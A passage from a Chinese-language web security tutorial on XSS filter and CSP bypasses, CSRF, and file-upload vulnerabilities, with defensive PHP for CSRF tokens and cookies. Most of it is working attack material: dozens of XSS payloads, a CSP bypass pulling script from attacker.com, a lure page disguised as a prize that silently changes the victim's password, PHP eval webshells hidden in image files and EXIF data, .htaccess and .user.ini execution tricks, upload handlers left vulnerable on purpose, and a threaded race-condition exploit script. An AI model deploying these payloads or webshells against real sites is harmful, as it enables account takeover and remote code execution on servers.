<svg onload=eval(name) name=alert(1)>

<!-- 利用异常捕获 -->
<img src=x onerror="throw alert(1),0">

<!-- with 语句绕过 -->
<script>with(document)alert(cookie)</script>
```

**6. 特殊标签和属性绕过**

```html
<!-- 使用 srcdoc 属性 -->
<iframe srcdoc="<script>alert(1)</script>"></iframe>

<!-- 使用 import（ES6 模块） -->
<script type="module">import 'data:text/javascript,alert(1)';</script>

<!-- 使用 xlink:href（SVG） -->
<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">click</text></a></svg>

<!-- 使用 formaction -->
<form><button formaction="javascript:alert(1)">click</button></form>

<!-- 使用 CSS expression（仅 IE） -->
<div style="x:expression(alert(1))">
<style>body{behavior:url(javascript:alert(1))}</style>

<!-- 使用 SVG animate -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>

<!-- 使用 MathML -->
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)"><mtext>click</mtext></maction></math>
```

**7. WAF 绕过高级技巧**

```html
<!-- Unicode 同形字 -->
<ımg src=x onerror=alert(1)>  <!-- ı 是土耳其语 i -->

<!-- 空字节注入 -->
<img%00 src=x onerror=alert(1)>
<scr%00ipt>alert(1)</script>

<!-- 换行分割关键字 -->
<img src=x oner
ror=alert(1)>

<!-- 标签嵌套 -->
<svg><script>alert(1)</script></svg>
<details><summary>x</summary><script>alert(1)</script></details>

<!-- 利用闭合标签 -->
</textarea><script>alert(1)</script>
</title><script>alert(1)</script>
</script><img src=x onerror=alert(1)>

<!-- DOM Clobbering（DOM 覆盖） -->
<form id="x"></form>
<img name="x" src=x onerror=alert(window.x)>

<!-- 利用 Mutation XSS（自闭合标签） -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)/>
```

**8. CSP 绕过**

```html
<!-- 当 CSP 允许 'unsafe-inline' 但限制 script-src 时 -->
<!-- 使用事件处理器（如果 CSP 没限制 inline event） -->
<img src=x onerror=alert(1)>

<!-- 当 CSP 允许 base-uri 时 -->
<base href="http://attacker.com/">
<script src="hook.js"></script>

<!-- 当 CSP 允许 JSONP 端点时 -->
<script src="/api/jsonp?callback=alert(1)//"></script>

<!-- 利用对象标签绕过 script-src -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- 利用 window.name 传值 -->
<iframe name="alert(1)" src="data:text/html,<script>eval(parent.name)</script>">
```

---

## 第四章：CSRF 跨站请求伪造

### 4.1 漏洞原理

CSRF（Cross-Site Request Forgery）攻击者诱导已登录用户访问恶意网站，利用用户的登录状态，以用户身份执行非预期操作。

**攻击成立条件**：
1. 用户已登录目标网站，且 Cookie 有效
2. 用户访问了攻击者控制的恶意页面
3. 目标网站的关键请求没有 CSRF 防护

### 4.2 攻击示例

**场景**：某网站修改密码的接口：
```
POST /change_password.php
参数: new_password=123456
```

**攻击页面**（attacker.com）：
```html
<!-- 自动提交的表单 -->
<body onload="document.getElementById('csrf').submit()">
<form id="csrf" action="http://target.com/change_password.php" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
</form>
</body>
```

用户已登录 target.com，访问 attacker.com 时，浏览器会自动携带 target.com 的 Cookie，发送修改密码请求。

### 4.3 其他利用方式

```html
<!-- GET 型 CSRF：用 img 标签 -->
<img src="http://target.com/delete_user.php?id=123" style="display:none">

<!-- JSON 型 CSRF -->
<script>
fetch('http://target.com/api/change_email', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: '{"email":"hacker@evil.com"}'
});
</script>
```

### 4.4 防护方法

1. **Token 验证**：请求中携带随机 Token，服务端校验
   ```php
   session_start();
   if (empty($_SESSION['csrf_token'])) {
       $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
   }
   // 表单中加入
   echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
   // 服务端校验
   if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
       die("CSRF 攻击检测");
   }
   ```

2. **SameSite Cookie**：Cookie 设置 SameSite 属性
   ```
   Set-Cookie: session=abc; SameSite=Strict
   Set-Cookie: session=abc; SameSite=Lax
   ```

3. **验证 Referer / Origin**：检查请求来源
4. **二次验证**：敏感操作输入密码或验证码
5. **关键操作使用 POST**：GET 只用于查询

### 🛠️ 补充：实战拓展

#### 一、CSRF 攻击示例代码

**1. 自动提交表单攻击（POST 型 CSRF）**

```html
<!-- attack.html - 攻击者页面，自动提交隐藏表单 -->
<!DOCTYPE html>
<html>
<head>
    <title>福利领取</title>
    <style>
        body { text-align: center; padding-top: 100px; font-family: Arial; }
        .prize-box { background: linear-gradient(135deg, #ff6b6b, #feca57); 
                     padding: 40px; border-radius: 15px; display: inline-block;
                     color: white; }
        #loading { display: none; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="prize-box">
        <h2>恭喜您获得 100 元红包！</h2>
        <p>点击下方按钮立即领取</p>
        <button id="btn" onclick="claim()" 
                style="padding:15px 40px;font-size:18px;background:white;
                       color:#ff6b6b;border:none;border-radius:25px;cursor:pointer;">
            立即领取
        </button>
    </div>
    <p id="loading">领取中，请稍候...</p>

    <!-- 隐藏的 CSRF 表单 -->
    <form id="csrf_form" 
          action="http://target.com/user/change_password.php" 
          method="POST" 
          style="display:none;">
        <input type="hidden" name="old_password" value="">
        <input type="hidden" name="new_password" value="hacker@123">
        <input type="hidden" name="confirm_password" value="hacker@123">
    </form>

    <script>
        function claim() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // 提交 CSRF 表单
            document.getElementById('csrf_form').submit();
            
            // 3秒后跳转到正常页面，掩盖攻击痕迹
            setTimeout(function(){
                location.href = 'https://www.example.com/thanks.html';
            }, 3000);
        }

        // 更隐蔽的方式：页面加载后自动提交（无需用户点击）
        // window.onload = function() {
        //     document.getElementById('csrf_form').submit();
        // };
    </script>
</body>
</html>
```

**2. GET 型 CSRF 攻击**

```html
<!-- 方式1：img 标签自动加载 -->
<img src="http://target.com/admin/delete_user.php?id=123" 
     style="display:none;" width="0" height="0">

<!-- 方式2：script 标签 -->
<script src="http://target.com/vote.php?item_id=1&action=support"></script>

<!-- 方式3：link 标签 -->
<link rel="stylesheet" href="http://target.com/api/add_friend?uid=999">

<!-- 方式4：iframe -->
<iframe src="http://target.com/delete.php?id=1" style="display:none;"></iframe>

<!-- 方式5：CSS background -->
<div style="background:url('http://target.com/unfollow?uid=555')"></div>
```

**3. JSON 型 CSRF 攻击**

```html
<!-- 方式1：使用 fetch + text/plain 绕过预检 -->
<script>
fetch('http://target.com/api/change_email', {
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain',  // 简单请求，不会触发预检
    },
    credentials: 'include',  // 携带 Cookie
    body: '{"email":"hacker@evil.com"}'
});
</script>

<!-- 方式2：使用 form 提交 JSON 数据（需服务端兼容） -->
<form id="json_form" 
      action="http://target.com/api/update_profile" 
      method="POST" 
      enctype="text/plain">
    <input type="hidden" name='{"nickname":"hacked","' value='x":"y"}'>
</form>
<script>
document.getElementById('json_form').submit();
</script>

<!-- 方式3：XMLHttpRequest 方式 -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/api/change_settings', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'text/plain');
xhr.send(JSON.stringify({theme: 'dark', lang: 'en'}));
</script>
```

**4. 跨域 Flash CSRF（已过时，但老系统可能存在）**

```actionscript
// csrf.swf - Flash CSRF
package {
    import flash.net.*;
    public class Csrf {
        public function Csrf() {
            var req:URLRequest = new URLRequest("http://target.com/change_password.php");
            req.method = "POST";
            var vars:URLVariables = new URLVariables();
            vars.new_password = "hacked123";
            req.data = vars;
            sendToURL(req);
        }
    }
}
```

**5. CSRF 自动扫描/利用脚本（Python）**

```python
#!/usr/bin/env python3
"""
CSRF 测试工具 - 用于授权测试
"""
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

def extract_forms(url, session):
    """提取页面中所有表单"""
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    forms = []
    for form in soup.find_all('form'):
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = []
        for inp in form.find_all(['input', 'select', 'textarea']):
            name = inp.get('name')
            if name:
                inputs.append({
                    'name': name,
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', '')
                })
        forms.append({
            'action': urljoin(url, action),
            'method': method,
            'inputs': inputs
        })
    return forms

def check_csrf_protection(form):
    """检查表单是否有 CSRF 防护"""
    csrf_keywords = ['csrf', 'token', 'nonce', '_token', 'authenticity']
    for inp in form['inputs']:
        name = inp['name'].lower()
        if any(k in name for k in csrf_keywords):
            return True, inp['name']
    return False, None

def generate_csrf_poc(form, output_file='csrf_poc.html'):
    """生成 CSRF PoC HTML 页面"""
    html = '''<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
    <h1>CSRF PoC - {action}</h1>
    <form id="csrf" action="{action}" method="{method}">
'''.format(action=form['action'], method=form['method'])
    
    for inp in form['inputs']:
        if inp['type'] == 'submit':
            continue
        # 设置示例值
        val = 'CSRF_TEST'
        if 'password' in inp['name'].lower():
            val = 'hacked123'
        elif 'email' in inp['name'].lower():
            val = 'hacked@evil.com'
        elif inp['value']:
            val = inp['value']
        html += f'        <input type="hidden" name="{inp["name"]}" value="{val}">\n'
    
    html += '''        <button type="submit">提交攻击</button>
    </form>
    <script>
        // 自动提交
        // document.getElementById('csrf').submit();
    </script>
</body>
</html>'''
    
    with open(output_file, 'w') as f:
        f.write(html)
    return output_file

# 使用示例
if __name__ == '__main__':
    target_url = 'http://target.com/user/profile'
    session = requests.Session()
    # 先登录获取 Cookie
    session.post('http://target.com/login.php', 
                 data={'username': 'testuser', 'password': 'testpass'})
    
    forms = extract_forms(target_url, session)
    for i, form in enumerate(forms):
        protected, token_field = check_csrf_protection(form)
        print(f"表单 {i+1}: {form['action']}")
        print(f"  方法: {form['method']}")
        print(f"  CSRF防护: {'有 (' + token_field + ')' if protected else '无 - 可能存在漏洞!'}")
        if not protected:
            poc_file = generate_csrf_poc(form, f'csrf_poc_{i+1}.html')
            print(f"  PoC已生成: {poc_file}")
```

#### 二、CSRF 防御实现代码

**1. Token 验证防护（PHP 完整实现）**

```php
<?php
/**
 * CSRF Token 防护类
 */
class CsrfProtection {
    
    /**
     * 生成 CSRF Token 并存入 Session
     */
    public static function generateToken() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        // 生成随机 Token
        $token = bin2hex(random_bytes(32));
        $_SESSION['csrf_token'] = $token;
        $_SESSION['csrf_token_time'] = time();
        
        return $token;
    }
    
    /**
     * 获取当前 CSRF Token（没有则生成）
     */
    public static function getToken() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        if (empty($_SESSION['csrf_token'])) {
            return self::generateToken();
        }
        
        // Token 有效期 1 小时
        if (isset($_SESSION['csrf_token_time']) && 
            time() - $_SESSION['csrf_token_time'] > 3600) {
            return self::generateToken();
        }
        
        return $_SESSION['csrf_token'];
    }
    
    /**
     * 输出隐藏的 Token 表单字段
     */
    public static function tokenField() {
        $token = self::getToken();
        echo '<input type="hidden" name="csrf_token" value="' . 
             htmlspecialchars($token, ENT_QUOTES, 'UTF-8') . '">';
    }
    
    /**
     * 验证 CSRF Token
     */
    public static function verifyToken($token = null) {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        if ($token === null) {
            $token = isset($_POST['csrf_token']) ? $_POST['csrf_token'] 
                     : (isset($_SERVER['HTTP_X_CSRF_TOKEN']) 
                        ? $_SERVER['HTTP_X_CSRF_TOKEN'] : '');
        }
        
        if (empty($_SESSION['csrf_token']) || empty($token)) {
            return false;
        }
        
        // 使用 hash_equals 防止时序攻击
        if (!hash_equals($_SESSION['csrf_token'], $token)) {
            return false;
        }
        
        // 验证通过后，可选择刷新 Token（一次性使用）
        // self::generateToken();
        
        return true;
    }
    
    /**
     * 销毁 Token（退出登录时调用）
     */
    public static function destroyToken() {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        unset($_SESSION['csrf_token']);
        unset($_SESSION['csrf_token_time']);
    }
}
```

**使用示例 - 表单页**：
```php
<?php
session_start();
require_once 'CsrfProtection.php';
?>
<form method="POST" action="change_password.php">
    <?php CsrfProtection::tokenField(); ?>
    <p>原密码：<input type="password" name="old_password"></p>
    <p>新密码：<input type="password" name="new_password"></p>
    <button type="submit">修改密码</button>
</form>
```

**使用示例 - 处理页**：
```php
<?php
session_start();
require_once 'CsrfProtection.php';

// 验证 CSRF Token
if (!CsrfProtection::verifyToken()) {
    http_response_code(403);
    die("CSRF 攻击检测，请求已被拒绝");
}

// 正常处理业务逻辑...
$new_password = $_POST['new_password'];
// ...
```

**AJAX 请求使用示例**：
```php
<!-- 页面中设置全局 Token -->
<meta name="csrf-token" content="<?php CsrfProtection::getToken(); ?>">

<script>
// AJAX 请求时自动携带 Token
var csrfToken = document.querySelector('meta[name="csrf-token"]').content;

function changeEmail(newEmail) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/change_email.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('X-CSRF-Token', csrfToken);  // 放在请求头中
    xhr.onload = function() {
        console.log(xhr.responseText);
    };
    xhr.send(JSON.stringify({email: newEmail}));
}
</script>
```

**2. SameSite Cookie 防护**

```php
<?php
/**
 * 设置安全的 Cookie（含 SameSite 属性）
 */
function setSecureCookie($name, $value, $expire = 0) {
    // PHP 7.3+ 支持 SameSite
    setcookie($name, $value, [
        'expires'  => $expire,
        'path'     => '/',
        'domain'   => '',
        'secure'   => true,       // 仅 HTTPS 传输
        'httponly' => true,       // 禁止 JS 读取（防 XSS 窃取）
        'samesite' => 'Strict'    // SameSite 严格模式（防 CSRF）
    ]);
}

// 低版本 PHP 兼容写法
function setSecureCookieCompat($name, $value, $expire = 0) {
    header("Set-Cookie: {$name}={$value}; " .
           "expires=" . gmdate('D, d M Y H:i:s T', $expire) . "; " .
           "path=/; Secure; HttpOnly; SameSite=Strict", false);
}

// 使用
session_start();
$sessionId = session_id();
setSecureCookie('session', $sessionId, time() + 3600);
?>
```

**SameSite 三种模式对比**：
| 模式 | 说明 | 跨站请求是否携带 Cookie |
|------|------|----------------------|
| `Strict` | 最严格，完全禁止第三方 Cookie | 否 |
| `Lax` | 宽松模式，允许安全的顶级导航携带 | 部分（GET 顶级导航） |
| `None` | 无限制（需配合 Secure） | 是 |

**3. Referer / Origin 验证防护**

```php
<?php
/**
 * 验证请求来源（Referer + Origin）
 */
function verifyRequestOrigin($allowed_domains = []) {
    // 如果是 GET 请求，不验证（GET 用于读取，不修改数据）
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        return true;
    }
    
    // 优先验证 Origin 头（更可靠）
    if (isset($_SERVER['HTTP_ORIGIN'])) {
        $origin = $_SERVER['HTTP_ORIGIN'];
        foreach ($allowed_domains as $domain) {
            if ($origin === $domain || strpos($origin, $domain) !== false) {
                return true;
            }
        }
        return false;
    }
    
    // 其次验证 Referer 头
    if (isset($_SERVER['HTTP_REFERER'])) {
        $referer = $_SERVER['HTTP_REFERER'];
        foreach ($allowed_domains as $domain) {
            if (strpos($referer, $domain) !== false) {
                return true;
            }
        }
        return false;
    }
    
    // 两个头都没有，拒绝请求（安全策略）
    return false;
}

// 使用示例
$allowed = [
    'https://example.com',
    'https://www.example.com',
];

if (!verifyRequestOrigin($allowed)) {
    http_response_code(403);
    die("非法请求来源");
}
```

**4. 双重 Cookie 提交（Double Submit Cookie）**

```php
<?php
/**
 * 双重 Cookie 提交模式（无需 Session 的 CSRF 防护）
 * 适用于分布式系统、无状态 API 等场景
 */
class DoubleSubmitCookie {
    
    public static function setCookie() {
        $token = bin2hex(random_bytes(32));
        setcookie('csrf_token', $token, [
            'expires' => time() + 3600,
            'path' => '/',
            'secure' => true,
            'httponly' => false,  // JS 需要读取这个 Cookie
            'samesite' => 'Strict'
        ]);
        return $token;
    }
    
    public static function verify() {
        $cookieToken = isset($_COOKIE['csrf_token']) ? $_COOKIE['csrf_token'] : '';
        $headerToken = isset($_SERVER['HTTP_X_CSRF_TOKEN']) ? $_SERVER['HTTP_X_CSRF_TOKEN'] : '';
        $postToken = isset($_POST['csrf_token']) ? $_POST['csrf_token'] : '';
        
        $submitToken = $headerToken ?: $postToken;
        
        if (empty($cookieToken) || empty($submitToken)) {
            return false;
        }
        
        return hash_equals($cookieToken, $submitToken);
    }
}
```

**前端使用**：
```javascript
// 从 Cookie 中读取 Token
function getCsrfToken() {
    var match = document.cookie.match(/csrf_token=([^;]+)/);
    return match ? match[1] : '';
}

// 发送请求时携带
fetch('/api/update', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': getCsrfToken()
    },
    credentials: 'include',
    body: JSON.stringify({...})
});
```

**5. 综合防护最佳实践清单**

```
✅ 必须做：
   1. 所有修改状态的请求（POST/PUT/DELETE）验证 CSRF Token
   2. Cookie 设置 SameSite=Lax 或 Strict
   3. Cookie 设置 HttpOnly（防 XSS 窃取）
   4. 敏感操作二次验证（输入密码、验证码）
   5. Token 使用加密安全的随机数生成（random_bytes）

✅ 建议做：
   1. Token 与用户 Session 绑定
   2. Token 一次性使用（每次验证后刷新）
   3. Token 设置有效期（如 1 小时）
   4. 验证 Referer/Origin 作为辅助手段
   5. 关键操作使用验证码

❌ 不要依赖：
   1. 仅靠 Referer 验证（可被篡改/伪造）
   2. 仅靠 POST 方法（可构造 CSRF 表单）
   3. 自定义 Header 无验证（XSS 可注入）
   4. 仅靠 HTTPS（HTTPS 不防 CSRF）
```

---

## 第五章：文件上传漏洞

### 5.1 漏洞原理

应用程序允许用户上传文件，但未正确验证文件类型、内容和存储方式，导致攻击者可以上传恶意脚本文件（如 Webshell），进而控制服务器。

### 5.2 漏洞分类

| 类型 | 说明 |
|------|------|
| **前端校验绕过** | 仅 JS 校验，可抓包修改 |
| **MIME 类型绕过** | 仅校验 Content-Type，可修改 |
| **后缀名绕过** | 黑名单不全、大小写、特殊后缀 |
| **.htaccess 绕过** | 上传 .htaccess 自定义解析 |
| **文件头绕过** | 只校验文件头，添加 GIF89a 等 |
| **解析漏洞** | 利用中间件解析特性 |
| **00 截断** | 利用 %00 截断文件名 |

### 5.3 常见绕过方式

**前端 JS 校验绕过**：
- 浏览器禁用 JS
- 抓包修改文件名和 Content-Type

**MIME 类型绕过**：
```
Content-Type: image/jpeg 改为 image/jpeg
Content-Type: application/octet-stream 改为 image/gif
```

**后缀名绕过（黑名单不全）**：
```
.php → .php3 .php4 .php5 .phtml .phps
.asp → .asa .aspx .ascx .ashx
.jsp → .jspx .jspf
```

**大小写绕过**：
```
.php → .Php .PHP .pHP
```

**双写绕过**：
```
.php → .pphphp
```

**特殊后缀（Windows）**：
```
shell.php → shell.php.
shell.php → shell.php空格
shell.php → shell.php:1.jpg
shell.php → shell.php::$DATA
```

**%00 截断**（PHP < 5.3.4）：
```
shell.php%00.jpg
```

**.htaccess 绕过**：
```
AddType application/x-httpd-php .jpg
```
上传 .htaccess 文件后，所有 .jpg 文件都会被当作 PHP 解析。

**文件头绕过**：
在 Webshell 前添加图片文件头：
```
GIF89a
<?php eval($_POST['cmd']);?>
```

### 5.4 解析漏洞

**Apache 解析漏洞**：
```
test.php.jpg  →  按 PHP 解析（从右往左找认识的后缀）
```

**IIS 6.0 解析漏洞**：
```
test.asp;xxx.jpg  →  按 ASP 解析
/xxx.asp/1.jpg    →  按 ASP 解析目录下的文件
```

**Nginx 解析漏洞**：
```
test.jpg/x.php    →  按 PHP 解析
```

### 5.5 防护方法

1. **白名单校验后缀名**：只允许指定类型（如 jpg、png、gif）
2. **文件内容检测**：使用 getimagesize()、finfo 等检测真实类型
3. **文件重命名**：随机文件名 + 时间戳
4. **存储目录隔离**：上传目录不可执行，放在 Web 目录外
5. **设置文件权限**：上传目录无执行权限
6. **使用 CDN / 对象存储**：第三方存储隔离风险
7. **文件头校验 + 二次渲染**：对图片重新生成

### 🛠️ 补充：实战拓展

#### 一、有漏洞的上传代码示例

**1. 前端 JS 校验（最容易绕过）**

```php
<!-- upload.html - 仅前端校验，可抓包绕过 -->
<html>
<body>
    <form action="upload.php" method="POST" enctype="multipart/form-data" 
          onsubmit="return checkFile()">
        <input type="file" id="file" name="file">
        <button type="submit">上传</button>
    </form>

    <script>
    function checkFile() {
        var file = document.getElementById('file').value;
        // 仅校验后缀名
        var ext = file.substring(file.lastIndexOf('.')).toLowerCase();
        if (ext != '.jpg' && ext != '.png' && ext != '.gif') {
            alert('只能上传图片文件！');
            return false;
        }
        return true;
    }
    </script>
</body>
</html>
```

**绕过方法**：
- 浏览器禁用 JS
- Burp Suite 抓包修改文件名和 Content-Type
- 先上传合法文件，抓包后修改内容

**2. 仅校验 Content-Type（MIME 绕过）**

```php
<?php
/**
 * upload_mime.php - 仅校验 Content-Type，存在 MIME 绕过漏洞
 */
$upload_dir = 'uploads/';
$filename = $_FILES['file']['name'];
$filetype = $_FILES['file']['type'];
$tmpname = $_FILES['file']['tmp_name'];

// 漏洞：仅校验 Content-Type 头
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($filetype, $allowed_types)) {
    die("只能上传图片文件！");
}

// 直接保存，未校验后缀名
$dest = $upload_dir . $filename;
if (move_uploaded_file($tmpname, $dest)) {
    echo "上传成功：" . $dest;
} else {
    echo "上传失败";
}
?>
```

**绕过方法**：
```
Burp 抓包，修改 Content-Type:
Content-Type: application/x-httpd-php  →  Content-Type: image/jpeg

文件名保持 shell.php，服务端只看 Content-Type
```

**3. 黑名单校验（后缀绕过）**

```php
<?php
/**
 * upload_blacklist.php - 黑名单校验，存在多种绕过
 */
$upload_dir = 'uploads/';
$filename = $_FILES['file']['name'];
$tmpname = $_FILES['file']['tmp_name'];

// 漏洞：黑名单不完整
$blacklist = ['.php', '.php5', '.phtml'];
$ext = strrchr($filename, '.');  // 获取后缀

if (in_array($ext, $blacklist)) {
    die("禁止上传该类型文件！");
}

$dest = $upload_dir . $filename;
move_uploaded_file($tmpname, $dest);
echo "上传成功：" . $dest;
?>
```

**常见绕过后缀**：
```
.php3 .php4 .php5 .php7 .phtml .phps .inc
.php. .php  (末尾加点或空格，Windows 特性)
.php::$DATA  (Windows NTFS 流)
.PHP .Php .pHp  (大小写绕过，Windows 不区分)
.pphphp  (双写绕过，WAF 只替换一次)
```

**4. 白名单校验（解析漏洞 + %00 截断）**

```php
<?php
/**
 * upload_whitelist.php - 白名单校验，但存在解析漏洞利用可能
 */
$upload_dir = 'uploads/';
$filename = $_FILES['file']['name'];
$tmpname = $_FILES['file']['tmp_name'];

// 白名单校验
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);

if (!in_array(strtolower($ext), $allowed_ext)) {
    die("只能上传图片文件！");
}

// 漏洞：未做重命名，文件名用户可控
// 可结合中间件解析漏洞
$dest = $upload_dir . $filename;
move_uploaded_file($tmpname, $dest);
echo "上传成功：" . $dest;
?>
```

**配合中间件解析漏洞利用**：
```
Apache:  shell.php.jpg   →  从右往左找，不认识 .jpg 就用 .php 解析
IIS 6:   shell.asp;1.jpg  →  分号后忽略，按 ASP 解析
Nginx:   shell.jpg/shell.php → 路径解析漏洞
```

**5. 文件头校验（图片马绕过）**

```php
<?php
/**
 * upload_header.php - 仅校验文件头（图片魔法字节）
 */
$upload_dir = 'uploads/';
$filename = $_FILES['file']['name'];
$tmpname = $_FILES['file']['tmp_name'];

// 读取文件头 2 字节判断是否为图片
$fp = fopen($tmpname, 'rb');
$header = fread($fp, 2);
fclose($fp);

// JPEG: FF D8, PNG: 89 50, GIF: 47 49
$is_image = ($header[0] == chr(0xFF) && $header[1] == chr(0xD8)) ||
            ($header[0] == chr(0x89) && $header[1] == chr(0x50)) ||
            ($header[0] == 'G' && $header[1] == 'I');

if (!$is_image) {
    die("文件不是有效图片！");
}

// 仅校验文件头，后缀和内容未校验
$dest = $upload_dir . $filename;
move_uploaded_file($tmpname, $dest);
echo "上传成功：" . $dest;
?>
```

**绕过方法（图片马）**：
```bash
# 方式1：在图片后追加 PHP 代码
cat normal.jpg shell.php > shell.jpg

# 方式2：PHP 代码前加文件头
echo "GIF89a<?php eval(\$_POST['cmd']);?>" > shell.php.gif

# 方式3：使用 copy 命令合并图片和 Shell
copy /b normal.jpg + shell.php shell.jpg  # Windows
cat normal.jpg shell.php > shell.jpg       # Linux

# 方式4：在 EXIF 信息中注入代码
exiftool -Comment='<?php eval($_POST["x"]);?>' normal.jpg
```

**6. getimagesize() 校验（二次渲染绕过）**

```php
<?php
/**
 * upload_getimagesize.php - 使用 getimagesize 校验
 * 比文件头校验更严格，但仍可被图片马绕过
 */
$upload_dir = 'uploads/';
$tmpname = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];

// getimagesize 会返回图片尺寸，非图片返回 false
$info = @getimagesize($tmpname);
if (!$info) {
    die("不是有效的图片文件！");
}

// 白名单后缀
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);
if (!in_array(strtolower($ext), $allowed_ext)) {
    die("非法文件类型！");
}

$dest = $upload_dir . $filename;
move_uploaded_file($tmpname, $dest);
echo "上传成功：" . $dest;
?>
```

**绕过方法**：
- 正常图片 + 末尾追加 PHP 代码（能通过 getimagesize）
- 配合解析漏洞访问（如 `shell.jpg.php` 或 Apache 解析）

#### 二、各种绕过技巧与代码示例

**1. .htaccess 绕过（Apache）**

```
上传 .htaccess 文件内容：
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
SetHandler application/x-httpd-php

然后上传 shell.jpg（内容为 PHP 代码），访问时会被解析为 PHP
```

**完整 .htaccess 攻击链**：
```
步骤 1: 上传 .htaccess
        内容：AddType application/x-httpd-php .abc
        
步骤 2: 上传 shell.abc（PHP 代码）
        内容：<?php eval($_POST['cmd']);?>
        
步骤 3: 访问 /uploads/shell.abc，以 PHP 执行
```

**2. user.ini 绕过（PHP CGI/FastCGI）**

```
上传 .user.ini 文件内容：
auto_prepend_file = shell.jpg
auto_append_file  = shell.jpg

然后上传 shell.jpg（内容为 PHP 代码），
同目录下所有 PHP 文件执行前都会自动包含 shell.jpg
```

**3. %00 截断绕过（PHP < 5.3.4）**

```php
<?php
/**
 * 存在 00 截断漏洞的代码
 */
$upload_dir = 'uploads/';
$filename = $_FILES['file']['name'];
$tmpname = $_FILES['file']['tmp_name'];

// 白名单校验
$ext = pathinfo($filename, PATHINFO_EXTENSION);
$allowed = ['jpg', 'gif', 'png'];
if (!in_array(strtolower($ext), $allowed)) {
    die("只能上传图片！");
}

// 漏洞：保存路径中使用了 $_GET['name']，可被 %00 截断
$save_name = $_GET['name'];
$dest = $upload_dir . $save_name . '.' . $ext;
// 当 name=shell.php%00 时，实际保存为 uploads/shell.php

move_uploaded_file($tmpname, $dest);
echo "上传成功";
?>
```

**利用方式**：
```
文件名: test.jpg (合法图片后缀)
GET 参数: ?name=shell.php%00

最终路径: uploads/shell.php%00.jpg
PHP < 5.3.4 时，%00 会截断字符串，实际保存为 shell.php
```

**4. 条件竞争绕过（先上传后删除）**

```php
<?php
/**
 * upload_race.php - 存在条件竞争漏洞
 * 文件先保存到磁盘，校验不通过再删除
 * 攻击者可在删除前访问文件执行代码
 */
$upload_dir = 'uploads/';
$filename = $_FILES['file']['name'];
$tmpname = $_FILES['file']['tmp_name'];

// 先上传文件
$dest = $upload_dir . $filename;
move_uploaded_file($tmpname, $dest);

// 再校验文件内容（比如是否包含 <?php）
$content = file_get_contents($dest);
if (strpos($content, '<?php') !== false) {
    // 发现恶意代码，删除文件
    unlink($dest);
    die("文件包含恶意内容，已删除！");
}

echo "上传成功：" . $dest;
?>
```

**利用方法**：
```
1. 持续上传包含 sleep() 的 PHP 文件
   内容：<?php sleep(10);?>
   
2. 同时持续访问该文件
   while true; do curl http://target/uploads/shell.php; done

3. 在文件被删除前访问到，就能执行 PHP 代码
   如果 sleep(10) 生效，说明可执行，然后写入 Shell
```

**Python 条件竞争利用脚本**：
```python
#!/usr/bin/env python3
"""
文件上传条件竞争利用脚本（仅用于授权测试）
"""
import requests
import threading
import time

target = 'http://target.com/upload_race.php'
upload_url = target
shell_url = 'http://target.com/uploads/shell.php'

# 上传线程
def upload_worker():
    while not stop_event.is_set():
        files = {'file': ('shell.php', '<?php echo "RCE_OK"; ?>')}
        try:
            requests.post(upload_url, files=files, timeout=3)
        except:
            pass

# 访问线程
def access_worker():
    while not stop_event.is_set():
        try:
            r = requests.get(shell_url, timeout=2)
            if 'RCE_OK' in r.text:
                print(f"[+] 成功！Shell 地址: {shell_url}")
                stop_event.set()
                return
        except:
            pass

stop_event = threading.Event()

# 启动多个上传和访问线程
for _ in range(10):
    threading.Thread(target=upload_worker).start()
for _ in range(20):
    threading.Thread(target=access_worker).start()

try:
    while not stop_event.is_set():
        time.sleep(1)
except KeyboardInterrupt:
    stop_event.set()
```

**5. 中间件解析漏洞汇总**

| 中间件 | 漏洞场景 | 利用方式 |
|--------|---------|---------|
| **Apache** | 多后缀解析 | `shell.php.jpg` 按 PHP 解析 |
| **Apache** | AddHandler 配置不当 | 文件名含 `.php.` 即解析为 PHP |
| **Apache** | .htaccess | 上传 .htaccess 自定义解析规则 |
| **IIS 6.0** | 分号解析 | `shell.asp;1.jpg` 按 ASP 解析 |
| **IIS 6.0** | 目录解析 | `/shell.asp/1.jpg` 目录下文件按 ASP 解析 |
| **IIS 7.x** | FastCGI 解析 | `/shell.jpg/1.php` 按 PHP 解析 |
| **Nginx** | 空字节绕过 | `/shell.jpg%00.php` |
